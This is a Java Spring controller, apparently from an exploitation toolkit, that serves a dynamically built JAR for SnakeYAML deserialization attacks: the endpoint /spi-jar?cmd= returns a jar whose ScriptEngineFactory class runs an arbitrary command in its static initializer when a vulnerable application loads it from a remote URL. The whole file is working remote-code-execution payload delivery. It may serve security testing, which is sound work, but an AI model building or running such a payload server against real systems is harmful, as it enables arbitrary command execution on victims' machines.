package com.oobx.controller;

import com.oobx.chains.SpiJarHandler;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

/**
 * Serves a dynamically generated SnakeYAML SPI attack JAR.
 *
 * GET /spi-jar?cmd=COMMAND
 *
 * Returns a JAR containing com.oobx.RceFactory (implements ScriptEngineFactory)
 * whose static initializer executes the given command, plus the SPI descriptor
 * META-INF/services/javax.script.ScriptEngineFactory.
 *
 * Used by jchains_jndi_snakeyaml via:
 *   http://host.docker.internal:8711/spi-jar?cmd=ENCODED_CMD
 */
@RestController
public class SpiJarController {

    @Autowired
    private SpiJarHandler spiJarHandler;

    @GetMapping("/spi-jar")
    public ResponseEntity<byte[]> getSpiJar(@RequestParam String cmd) throws Exception {
        byte[] jar = spiJarHandler.generateSpiJar(cmd);
        return ResponseEntity.ok()
            .contentType(MediaType.parseMediaType("application/java-archive"))
            .header("Content-Disposition", "attachment; filename=rce.jar")
            .body(jar);
    }
}
